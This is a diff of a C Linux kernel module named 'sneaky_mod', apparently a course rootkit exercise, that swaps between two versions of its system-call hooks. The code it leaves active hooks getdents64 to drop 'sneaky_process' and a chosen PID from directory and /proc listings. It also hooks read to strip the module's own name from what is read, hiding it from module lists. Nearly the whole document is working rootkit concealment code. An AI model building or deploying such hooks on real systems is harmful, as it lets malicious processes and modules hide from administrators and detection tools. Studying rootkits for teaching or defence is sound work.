@@ -83,106 +83,110 @@ bool isSneakyProcess(struct linux_dirent64 *dirent) {
  * specified directory file descriptor,  and fills the directory entries it reads
  * into a buffer in user space. The sneaky version would ignore the snkeay_process
  */
-asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
-    // call original getdents64, and save bytes
-    int length = original_getdents64(regs);
+// asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
+//     // call original getdents64, and save bytes
+//     int length = original_getdents64(regs);
 
-    // get the start address of the linux_dirent struct
-    //struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
-    struct linux_dirent64* dirent = (void*)(regs->si);
+//     // get the start address of the linux_dirent struct
+//     //struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
+//     struct linux_dirent64* dirent = (void*)(regs->si);
 
-    int offset = 0;
+//     int offset = 0;
 
-    // if (isSneakyProcess(dirent)) {
-    // 	// if the first entry is sneaky_process, then skip it
-    // 	offset += dirent->d_reclen;
-    // 	// delete the sneaky_process from the buffer
-    // 	memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
-    //   length -= dirent->d_reclen;
-    // } else {
-    while (offset < length) {
-        struct linux_dirent64* temp = (void*)dirent + offset;
-        //struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
-        if (isSneakyProcess(temp)) {
-            // delete the sneaky_process from the buffer
-            memmove((void *)temp, (void *)temp + temp->d_reclen, length - temp->d_reclen - offset);
-            length -= temp->d_reclen;
-        } else {
-            offset += temp->d_reclen;
-        }
-    }
-    return length;
-}
-
-// asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
-//   int totalDirpLength = original_getdents64(regs);
-//   struct linux_dirent64* dirp = (void*)(regs->si);
-
-//   int curr = 0;
-//   while(curr < totalDirpLength){
-//     struct linux_dirent64* dirpTemp = (void*)dirp + curr;
-//     if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
-//       int reclen = dirpTemp->d_reclen;
-//       int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
-//       void* source = (void*)dirpTemp + reclen;
-//       memmove((void*)(regs->si) + curr, source, lenToBeCopied);
-//       totalDirpLength -= reclen;
-//     }
-//     else{
-//       curr += dirpTemp->d_reclen;
-//     }
-//   }
-//   return totalDirpLength;
-// }
-
-
-
-
-// asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
-
-// char * findPos(char* start, const char * target, ssize_t length) {
-//     char * pos = strnstr(start, target, length);
-//     return pos;
-// }
-
-// asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
-//     ssize_t length = (*original_read)(regs);
-//     void * begin = (void *)regs->si;
-//     char * first = findPos((char *)begin, "sneaky_mod", length);
-//     if (first != NULL) {
-//         char * second = findPos((char *)first, "\n", length - (first - (char *)begin));
-//         if (second != NULL) {
-//             memmove(first, second + 1, length - (second - (char *)begin) - 1);
-//             length = length - (ssize_t)(second - first) - 1;
+//     // if (isSneakyProcess(dirent)) {
+//     // 	// if the first entry is sneaky_process, then skip it
+//     // 	offset += dirent->d_reclen;
+//     // 	// delete the sneaky_process from the buffer
+//     // 	memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
+//     //   length -= dirent->d_reclen;
+//     // } else {
+//     while (offset < length) {
+//         struct linux_dirent64* temp = (void*)dirent + offset;
+//         //struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
+//         if (isSneakyProcess(temp)) {
+//             // delete the sneaky_process from the buffer
+//             memmove((void *)temp, (void *)temp + temp->d_reclen, length - temp->d_reclen - offset);
+//             length -= temp->d_reclen;
+//         } else {
+//             offset += temp->d_reclen;
 //         }
 //     }
 //     return length;
 // }
 
-asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
-/**
- * @brief sneaky read
- *
- * @param regs
- * @return asmlinkage
- */
+static char* pid = "";
+module_param(pid, charp, 0);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
+  int totalDirpLength = original_getdents64(regs);
+  struct linux_dirent64* dirp = (void*)(regs->si);
+
+  int curr = 0;
+  while(curr < totalDirpLength){
+    struct linux_dirent64* dirpTemp = (void*)dirp + curr;
+    if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
+      int reclen = dirpTemp->d_reclen;
+      int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
+      void* source = (void*)dirpTemp + reclen;
+      memmove((void*)(regs->si) + curr, source, lenToBeCopied);
+      totalDirpLength -= reclen;
+    }
+    else{
+      curr += dirpTemp->d_reclen;
+    }
+  }
+  return totalDirpLength;
+}
+
+
+
+
+asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
+
+char * findPos(char* start, const char * target, ssize_t length) {
+    char * pos = strnstr(start, target, length);
+    return pos;
+}
+
 asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
-    ssize_t bytesRead = original_read(regs);
-
-    if (bytesRead > 0) {
-        void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
-        if (posStart != NULL) {
-            void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
-            if (posEnd != NULL) {
-                int size = posEnd - posStart + 1;
-                memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
-                bytesRead -= size;
-            }
+    ssize_t length = (*original_read)(regs);
+    void * begin = (void *)regs->si;
+    char * first = findPos((char *)begin, "sneaky_mod", length);
+    if (first != NULL) {
+        char * second = findPos((char *)first, "\n", length - (first - (char *)begin));
+        if (second != NULL) {
+            memmove(first, second + 1, length - (second - (char *)begin) - 1);
+            length = length - (ssize_t)(second - first) - 1;
         }
     }
-    return bytesRead;
+    return length;
 }
+
+// asmlinkage ssize_t (*original_read)(struct pt_regs *);
+
+// /**
+//  * @brief sneaky read
+//  *
+//  * @param regs
+//  * @return asmlinkage
+//  */
+// asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
+//     ssize_t bytesRead = original_read(regs);
+
+//     if (bytesRead > 0) {
+//         void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
+//         if (posStart != NULL) {
+//             void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
+//             if (posEnd != NULL) {
+//                 int size = posEnd - posStart + 1;
+//                 memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
+//                 bytesRead -= size;
+//             }
+//         }
+//     }
+//     return bytesRead;
+// }
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
